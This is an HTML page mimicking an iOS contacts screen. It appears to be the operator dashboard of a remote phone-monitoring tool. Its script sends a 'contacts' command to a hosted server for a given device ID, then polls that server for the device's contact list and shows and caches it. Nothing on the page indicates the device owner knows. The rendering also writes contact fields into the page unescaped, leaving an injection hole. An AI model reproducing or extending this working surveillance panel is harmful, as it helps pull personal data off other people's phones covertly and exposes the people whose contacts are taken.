<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #000000;
            --text-main: #ffffff;
            --text-sub: #8e8e93;
            --search-bg: #1c1c1e;
            --separator: rgba(255, 255, 255, 0.15);
            --blue-accent: #0a84ff;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0; padding: 0;
            display: flex; justify-content: center;
            min-height: 100vh;
        }

        .container {
            width: 100%; max-width: 480px;
            background: #000;
            display: flex; flex-direction: column;
            position: relative;
            min-height: 100vh;
        }

        /* --- HEADER (iOS Style) --- */
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px;
            background: rgba(20, 20, 20, 0.95);
            position: sticky; top: 0; z-index: 100;
            backdrop-filter: blur(10px);
            border-bottom: 0.5px solid var(--separator);
        }

        .back-btn {
            color: var(--blue-accent); font-size: 1.2rem;
            text-decoration: none; width: 30px; height: 30px;
            display: flex; align-items: center; justify-content: center;
        }

        .page-title { 
            font-size: 1.1rem; font-weight: 600; color: var(--text-main);
        }

        .refresh-btn {
            background: transparent; border: none;
            color: var(--blue-accent); font-size: 1.1rem; 
            cursor: pointer; padding: 0;
        }

        /* --- SEARCH BAR --- */
        .search-container {
            padding: 10px 15px;
            background: #000;
            position: sticky; top: 60px; z-index: 90;
        }

        .search-box {
            background: var(--search-bg);
            border-radius: 10px;
            display: flex; align-items: center;
            padding: 8px 12px;
        }

        .search-icon { color: var(--text-sub); margin-right: 8px; font-size: 0.9rem; }

        .search-input {
            background: transparent; border: none; outline: none;
            color: var(--text-main); width: 100%; font-size: 1rem;
        }
        
        .search-input::placeholder { color: var(--text-sub); }

        /* --- CONTACT LIST --- */
        .contact-list { 
            display: flex; flex-direction: column; 
            padding-bottom: 50px;
        }

        .contact-row {
            display: flex; align-items: center;
            padding: 12px 20px;
            border-bottom: 0.5px solid var(--separator);
            transition: background 0.2s;
        }

        .contact-row:active { background: #1c1c1e; }
        
        /* Hidden class for search */
        .hidden { display: none !important; }

        /* Avatar Circle */
        .avatar {
            width: 40px; height: 40px;
            background: #2c2c2e; /* iOS Gray Circle */
            color: #fff;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-weight: 600; font-size: 1.1rem;
            margin-right: 15px; flex-shrink: 0;
        }

        .info { flex: 1; overflow: hidden; }
        
        .name { 
            font-size: 1rem; font-weight: 600; color: #fff;
            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
        }
        
        .number { 
            font-size: 0.85rem; color: var(--text-sub); margin-top: 2px;
        }

        /* Call Button on Right */
        .call-action {
            width: 35px; height: 35px;
            display: flex; align-items: center; justify-content: center;
            color: var(--blue-accent); font-size: 1.1rem;
            text-decoration: none; margin-left: 10px;
            background: rgba(10, 132, 255, 0.1); border-radius: 50%;
        }

        .empty-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Contacts</span>
            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">
                <i class="fa-solid fa-rotate"></i>
            </button>
        </div>

        <div class="search-container">
            <div class="search-box">
                <i class="fa-solid fa-magnifying-glass search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search" oninput="filterContacts()">
            </div>
        </div>

        <div class="contact-list" id="contactsContainer">
            <div class="empty-msg">Loading Contacts...</div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        
        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
        const storageKey = `contacts_${DEVICE_ID}`;
        let retryCount = 0;
        let allContactsData = []; 

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                alert("Device ID Missing!");
                return;
            }
            loadFromStorage();
            handleRefresh(); // Auto refresh on load
        });

        function loadFromStorage() {
            const saved = localStorage.getItem(storageKey);
            if (saved) {
                allContactsData = JSON.parse(saved);
                renderContacts(allContactsData);
            }
        }

        // --- FAST SEARCH (No UI Lag) ---
        let searchTimeout;
        function filterContacts() {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                const query = document.getElementById('searchInput').value.toLowerCase();
                const rows = document.querySelectorAll('.contact-row');
                
                rows.forEach(row => {
                    const searchData = row.getAttribute('data-search');
                    if (searchData && searchData.includes(query)) {
                        row.classList.remove('hidden');
                    } else {
                        row.classList.add('hidden');
                    }
                });
            }, 50); 
        }

        function handleRefresh() {
            retryCount = 0;
            const btn = document.getElementById("refreshBtn");
            const icon = btn.querySelector('i');
            icon.classList.add('fa-spin'); // Start spinning

            // Send command first
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            }).then(() => {
                // Wait then fetch
                setTimeout(fetchData, 4000);
            }).catch(e => {
                console.error(e);
                icon.classList.remove('fa-spin');
            });
        }

        function fetchData() {
            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;
            const btn = document.getElementById("refreshBtn");
            const icon = btn.querySelector('i');

            fetch(apiURL)
                .then(res => res.json())
                .then(data => {
                    if (!data || data.length === 0) {
                        if (retryCount < 3) { // Try 3 times
                            retryCount++;
                            setTimeout(fetchData, 4000);
                        } else {
                            icon.classList.remove('fa-spin'); // Stop spinning
                        }
                        return;
                    }

                    allContactsData = data; 
                    localStorage.setItem(storageKey, JSON.stringify(data));
                    renderContacts(data);
                    icon.classList.remove('fa-spin'); // Success stop
                })
                .catch(err => {
                    console.error("Error fetching", err);
                    icon.classList.remove('fa-spin');
                });
        }

        function renderContacts(data) {
            const container = document.getElementById("contactsContainer");
            
            // Sort Alphabetically
            data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));

            let htmlBuffer = "";
            
            data.forEach(contact => {
                const name = contact.name || "Unknown";
                const num = contact.number || contact.phone || "";
                const firstLetter = name.charAt(0).toUpperCase();
                
                // Search optimization string
                const searchString = (name + " " + num).toLowerCase();

                // Random pastel color for avatar if you want, currently simplified to iOS Gray
                htmlBuffer += `
                    <div class="contact-row" data-search="${searchString}">
                        <div class="avatar">${firstLetter}</div>
                        <div class="info">
                            <div class="name">${name}</div>
                            <div class="number">${num}</div>
                        </div>
                        <a href="tel:${num}" class="call-action">
                            <i class="fa-solid fa-phone"></i>
                        </a>
                    </div>`;
            });

            if (data.length === 0) {
                container.innerHTML = `<div class="empty-msg">No Contacts Found</div>`;
            } else {
                container.innerHTML = htmlBuffer;
            }
            
            // Re-apply search if exists
            const currentSearch = document.getElementById('searchInput').value;
            if(currentSearch) filterContacts();
        }
    </script>
</body>
</html>
